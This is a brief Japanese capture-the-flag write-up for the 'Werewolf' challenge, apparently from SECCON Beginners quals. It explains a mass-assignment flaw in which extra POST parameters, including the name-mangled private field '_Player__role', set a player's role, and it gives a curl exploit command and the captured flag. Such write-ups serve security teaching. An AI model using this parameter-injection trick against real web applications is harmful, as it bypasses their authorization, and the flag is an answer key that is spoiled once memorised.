## Werewolf
### 解法
- ソースを見ると、L40 付近でPOSTされたパラメータをすべてPlayerに設定していることがわかる。
- よってPOST時に __role のパラメータを追加して渡すことで自分の役割を自由に決めることができる
- __role はprivate変数のため、dict上は『_Player__role』で管理されていることに注意

### 例
curl の場合
```
curl -v -X POST --data 'name=aaa&color=red&_Player__role=WEREWOLF' https://werewolf.quals.beginners.seccon.jp/
```

### flag
```
ctf4b{there_are_so_many_hackers_among_us}
```
